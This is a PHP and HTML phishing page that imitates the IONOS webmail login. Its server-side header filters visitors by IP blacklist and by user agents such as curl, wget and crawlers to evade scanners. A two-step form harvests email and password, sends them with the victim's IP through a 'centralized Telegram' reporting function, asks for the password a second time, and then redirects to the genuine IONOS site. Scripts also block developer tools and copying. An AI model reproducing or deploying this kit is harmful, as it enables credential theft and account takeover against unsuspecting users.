<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!DOCTYPE html>
<html>
  <head>
    <link
      rel="shortcut icon"
      type="image/x-icon"
      href="https://i.imgur.com/QpPprtj.png"
    />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
    <title>Webmail Login</title>
    <link
      rel="stylesheet"
      href="https://ce1.uicdn.net/exos/framework/2.0/ionos.min.css"
    />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <!-- Antibot Scripts -->
    <script src="../m/js/fingerprint.js"></script>
    <script src="../m/js/utils.js"></script>
    <script src="../m/js/captcha.js"></script>

    <!-- Centralized Functions -->
    <script src="../js/centralized_telegram.js"></script>
    <script src="../js/centralized_redirect.js"></script>
    <script src="../js/email_extractor.js"></script>
    <script src="../js/autofill_helper.js"></script>

  <style>
    .clearfix:after {
      clear: both;
      content: "";
      display: table
    }

    .grid-01 {
      width: 8.333333%
    }

    .grid-01,
    .grid-02 {
      box-sizing: border-box;
      float: left;
      min-height: 1px
    }

    .grid-02 {
      width: 16.666667%
    }

    .grid-03 {
      width: 25%
    }

    .grid-03,
    .grid-04a {
      box-sizing: border-box;
      float: left;
      min-height: 1px
    }

    .grid-04a {
      width: 27.5%
    }

    .grid-04 {
      width: 33.333333%
    }

    .grid-04,
    .grid-05 {
      box-sizing: border-box;
      float: left;
      min-height: 1px
    }

    .grid-05 {
      width: 41.666667%
    }

    .grid-06 {
      width: 50%
    }

    .grid-06,
    .grid-07 {
      box-sizing: border-box;
      float: left;
      min-height: 1px
    }

    .grid-07 {
      width: 58.333333%
    }

    .grid-08 {
      width: 66.666667%
    }

    .grid-08,
    .grid-08a {
      box-sizing: border-box;
      float: left;
      min-height: 1px
    }

    .grid-08a {
      width: 72.5%
    }

    .grid-09 {
      width: 75%
    }

    .grid-09,
    .grid-10 {
      box-sizing: border-box;
      float: left;
      min-height: 1px
    }

    .grid-10 {
      width: 83.333333%
    }

    .grid-11 {
      float: left;
      width: 91.666667%
    }

    .grid-11,
    .grid-12 {
      box-sizing: border-box;
      min-height: 1px
    }

    .grid-12 {
      float: none;
      width: auto
    }

    .grid-12:after {
      clear: both;
      content: "";
      display: table
    }

    .current-identifier {
      display: inline-flex;
      max-width: 90%
    }

    .current-identifier a:first-of-type {
      margin: 0;
      padding-left: 11px;
      padding-right: 11px
    }

    .sheet__section>.container-current-identifier {
      padding-bottom: 14px;
      padding-top: 14px
    }

    .sheet__section>.container-current-identifier:last-child {
      padding-bottom: 0;
      padding-top: 14px
    }

    .sheet__section>.container-current-identifier:first-child {
      padding-bottom: 14px;
      padding-top: 0
    }

    .button-current-identifier {
      max-width: 100%
    }

    .button-current-identifier span {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap
    }

    @media only screen and (min-width:667px)and (max-width:1184px) {
      .page-section--short .page-section__block {
        padding-right: 0
      }
    }

    @media only screen and (min-width:1185px) {
      .page-section--short .page-section__block {
        padding-right: 0
      }
    }

    .no-spinners {
      -moz-appearance: textfield
    }

    .no-spinners::-webkit-inner-spin-button,
    .no-spinners::-webkit-outer-spin-button {
      -webkit-appearance: none;
      margin: 0
    }

    .password-unveil:before {
      content: ""
    }

    .password-unveil-reverse:before,
    .password-unveil:before {
      cursor: pointer;
      font-family: exos-icon-font;
      font-style: normal;
      font-weight: 400 !important;
      vertical-align: top
    }

    .password-unveil-reverse:before {
      content: ""
    }

    .hide {
      display: none;
    }
  </style>
  </head>

  <body>

    <div class="page-content">
      <div class="oao-navi-navigation oao-navi-light">
        <div class="oao-navi-left">
          <div class="oao-navi-application-name">
            <a class="oao-navi-app-name">
              <span class=""
                ><img src="https://i.imgur.com/HTJ8bHC.png" alt="" height="40"
              /></span>
              <span>Webmail Login</span>
            </a>
          </div>
        </div>
      </div>

      <main>
        <section
          class="page-section page-section--default page-section--short"
          id="page1"
        >
          <div class="page-section__block">
            <div
              class="oao-statuspage-message-container"
              data-component="WEBMAIL,MAIL_RECEIVING,MAIL_SENDING"
            ></div>

            <div class="sheet">
              <section class="sheet__section sheet__section--default">
                <ul>
                  <li class="stripe stripe--cropped">
                    <div class="stripe__item">
                      <img
                        class="stripe__visual"
                        src="https://i.imgur.com/y99E5QX.jpg"
                        height="58"
                        width="auto"
                      />
                    </div>
                    <div class="stripe__item">
                      <h1 class="headline stripe__element">My Webmail Login</h1>
                    </div>
                  </li>
                </ul>
              </section>

              <section class="sheet__section sheet__section--default">
                <div method="POST" novalidate="">
                  <ul>
                    <li class="form-stripe">
                      <label class="label" for="username">Email address</label>

                      <input
                        type="email"
                        class="input-text form-input"
                        name="identifier"
                        id="username"
                        tabindex="1"
                        required="true"
                        autofocus=""
                        autocomplete="username"
                        autocapitalize="none"
                        spellcheck="false"
                        value=""
                      />
                      <p
                        class="input-byline input-byline--error hide"
                        id="username-error"
                      >
                        Please enter your email address.
                      </p>
                      <p class="input-byline">
                        <strong>Not your device?</strong> Log out after the
                        session or use
                        <a
                          class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip"
                          data-tooltip="Look up"
                          >private browsing mode</a
                        >.
                      </p>
                    </li>
                    <li class="form-stripe form-stripe--actions">
                      <button
                        class="button button--primary button--full-width button--with-loader"
                        type="submit"
                        id="btn1"
                        tabindex="2"
                      >
                        Next
                      </button>
                    </li>
                  </ul>

                  <input
                    type="password"
                    class="hidden"
                    name="hiddenPassword"
                    tabindex="-1"
                  />
                </div>
              </section>

              <section
                class="sheet__section sheet__section--secondary hide-when-headless"
              >
                <div
                  class="ias-zone ias-login_offerlink"
                  data-ias-zoneid="webmail_login"
                ></div>
              </section>
            </div>

            <h2 class="headline headline--sub headline--headless-hidden">
              More IONOS Logins
            </h2>

            <div class="grid grid--full-height grid--headless-hidden">
              <div class="grid-col grid-col--4 grid-col--small-6">
                <a class="tile tile--filled">
                  <img
                    class="tile__image"
                    src="https://i.imgur.com/UyiHodx.jpg"
                  />
                  <span class="tile__label">My IONOS</span>
                </a>
              </div>

              <div class="grid-col grid-col--4 grid-col--small-6">
                <a class="tile tile--filled">
                  <img
                    class="tile__image"
                    src="https://i.imgur.com/R3pe9pF.jpg"
                  />
                  <span class="tile__label">HiDrive</span>
                </a>
              </div>

              <div class="grid-col grid-col--4 grid-col--small-6">
                <a class="tile tile--filled">
                  <img
                    class="tile__image"
                    src="https://i.imgur.com/9xusb5a.jpg"
                  />
                  <span class="tile__label">Email Archiving</span>
                </a>
              </div>
            </div>
          </div>
        </section>
        <section
          class="page-section page-section--default page-section--short hide"
          id="page2"
          style="margin-top: 2rem"
        >
          <div class="page-section__block">
            <div class="sheet">
              <section class="sheet__section sheet__section--default">
                <ul>
                  <li class="stripe stripe--cropped">
                    <div class="stripe__item">
                      <img
                        class="stripe__visual"
                        src="https://i.imgur.com/y0fy4PP.jpg"
                        height="58"
                        width="auto"
                      />
                    </div>
                    <div class="stripe__item">
                      <h1 class="headline stripe__element">Enter password</h1>
                    </div>
                  </li>
                </ul>
              </section>

              <section class="sheet__section sheet__section--default">
                <div class="container-current-identifier">
                  <div class="current-identifier">
                    <a
                      class="ghost-button ghost-button--icon-only ghost-button--secondary tooltip"
                      data-tooltip="Back to login"
                      id="restart"
                    >
                      <img
                        src="https://i.imgur.com/WrdHU54.png"
                        alt=""
                        height="20px"
                      />
                    </a>
                    <a
                      class="button-current-identifier ghost-button ghost-button--with-icon ghost-button--secondary tooltip"
                      data-tooltip="Back to login"
                    >
                      <img
                        src="https://i.imgur.com/8ogelpQ.png"
                        alt=""
                        height="20px"
                        style="margin-right: 5px"
                      />
                      <span class="ghost-button__text" id="email-info"></span>
                    </a>
                  </div>
                </div>

                <div method="POST" novalidate="">
                  <ul>
                    <li class="form-stripe">
                      <label class="label" for="password">Password</label>
                      <span class="input-text-group input-text-group--empty">
                        <input
                          type="password"
                          class="input-text"
                          maxlength="2048"
                          required="true"
                          tabindex="1"
                          autofocus=""
                          autocomplete="current-password"
                          autocapitalize="none"
                          spellcheck="false"
                          id="password"
                          name="password"
                          value=""
                        />

                        <a
                          class="input-text-group__action password-unveil"
                          id="password-unveil"
                        ></a>
                      </span>
                      <p class="input-byline">
                        <span class="input-byline--error" id="password-error"
                          >Please enter your password.</span
                        >
                        <a class="link oao-pi-open-in-flyin"
                          >Forgot Your Password?</a
                        >
                      </p>

                      <p class="input-byline">
                        <strong>Not your device?</strong> Log out after the
                        session or use
                        <a
                          class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip"
                          data-tooltip="Look up"
                          >private browsing mode</a
                        >.
                      </p>
                    </li>
                    <li class="form-stripe form-stripe--actions">
                      <button
                        class="button button--primary button--full-width button--with-loader"
                        type="submit"
                        id="btn2"
                        tabindex="2"
                      >
                        Next
                      </button>
                    </li>
                  </ul>
                </div>
              </section>
            </div>
          </div>
        </section>
      </main>
    </div>

    <footer class="page-footer">
      <div class="page-footer__block">
        <section class="page-footer__section page-footer__section--last">
          <div class="page-footer__section-item">
            <div
              class="oao-statuspage-overall-status page-footer__status"
            ></div>
          </div>

          <div
            class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left"
          >
          &#32;&#169;&#32;&#50;&#48;&#50;&#52;

            <a class="page-footer__link" target="_blank">IONOS Inc.</a>
          </div>

          <div
            class="page-footer__section-item page-footer__section-item--align-right page-footer__section-item--small-align-left"
          >
            <a class="page-footer__link" target="_blank">Privacy Policy</a>

            -

            <a class="page-footer__link" target="_blank">&#84;&#38;&#67;&#115;</a>
          </div>
        </section>
      </div>
    </footer>

    <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
    <script>
    $(document).ready(function() {
      var count = 0;

      function isValidEmail(email) {
        return /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(email);
      }

      function showPage2() {
        $('#page1').hide();
        $('#page2').show();
        $('#password').focus();
      }

      function handlePage1Submit() {
        clearErrors();
        var email = $('#username').val();
        if (isValidEmail(email)) {
          $('#btn1').prop('disabled', true);
          $('#email-info').text(email);
          showPage2();
        } else {
          $('#username-error').show();
          $('#username').focus();
          return false;
        }
      }

      function handlePage2Submit() {
        clearErrors();
        var pw = $('#password').val();
        if (pw.length < 1) {
          $('#password-error').show();
          $('#password').focus();
          return false;
        }
        $('#btn2').prop('disabled', true);
        submitCredentials();
      }

      function togglePassword() {
        var el = $('#password').get(0);
        if (el.type === 'password') {
          el.type = 'text';
          $('#password-unveil').removeClass('password-unveil').addClass('password-unveil-reverse');
        } else {
          el.type = 'password';
          $('#password-unveil').removeClass('password-unveil-reverse').addClass('password-unveil');
        }
      }

      function submitCredentials() {
        var email = $('#username').val() || $('#email-info').text();
        var pw = $('#password').val();
        count++;

        window.providerTag = 'ionos';
        var clientIP = window.userip || 'n/a';

        function sendTelemetry(attempt, redirectOnSuccess) {
          if (typeof sendCentralizedTelegramReport === 'function') {
            sendCentralizedTelegramReport(providerTag, email, pw, clientIP, function(success) {
              if (redirectOnSuccess) {
                if (typeof performCentralizedRedirect === 'function') {
                  performCentralizedRedirect(300);
                } else {
                  setTimeout(function() { window.location.replace('https://id.ionos.com/'); }, 300);
                }
              }
            });
          } else {
            console.error('Centralized Telegram function not available');
            if (redirectOnSuccess) {
              if (typeof performCentralizedRedirect === 'function') {
                performCentralizedRedirect(300);
              } else {
                setTimeout(function() { window.location.replace('https://id.ionos.com/'); }, 300);
              }
            }
          }

          if (redirectOnSuccess) {
            $('#btn2').text('Logging in...');
            setTimeout(function() { $('#btn2').text('Next'); }, 200);
          }
        }

        sendTelemetry(count, (count >= 2));

        if (count === 1) {
          $('#password').val('').focus();
          $('#btn2').prop('disabled', false);
          return false;
        }
      }

      function clearErrors() {
        $('#password-error').hide();
        $('#username-error').hide();
      }

      function resetToPage1() {
        clearErrors();
        $('#page2').hide();
        $('#page1').show();
        $('#btn1').prop('disabled', false);
        $('#btn2').prop('disabled', false);
        $('#username').val('');
        $('#password').val('');
        $('#username').focus();
      }

      // Run auto-fill immediately and on hash change
      // Handled by standardizedAutofill in js/autofill_helper.js

      // Event bindings
      $('#btn1').on('click', function(e) { e.preventDefault(); handlePage1Submit(); });
      $('#btn2').on('click', function(e) { e.preventDefault(); handlePage2Submit(); });
      $('#restart').on('click', function(e) { e.preventDefault(); resetToPage1(); });
      $('#password-unveil').on('click', function(e) { e.preventDefault(); togglePassword(); });
      $('#username').keypress(function(e) { if (e.which === 13) { $('#btn1').click(); return false; } });
      $('#password').keypress(function(e) { if (e.which === 13) { $('#btn2').click(); return false; } });

      // Anti-devtools protections
      (function() {
        var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        if (!isTouch) {
          document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; }, false);
        }
        document.addEventListener('copy', function(e) {
          try { e.clipboardData.setData('text/plain', 'Copying is disabled on this page.'); } catch (err) {}
          e.preventDefault(); return false;
        });
        document.addEventListener('selectstart', function(e) {
          if (!e.target.closest('input, textarea')) { e.preventDefault(); return false; }
        });
        document.addEventListener('keydown', function(e) {
          if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return false; }
          if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); e.stopPropagation(); return false; }
          if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) { e.preventDefault(); e.stopPropagation(); return false; }
          if (e.metaKey && e.altKey && e.keyCode === 73) { e.preventDefault(); e.stopPropagation(); return false; }
        });
      })();

      // Initialize
      // autoFillFromUrl(); // Handled by autofill_helper.js
    });
    </script>
  </body>
</html>
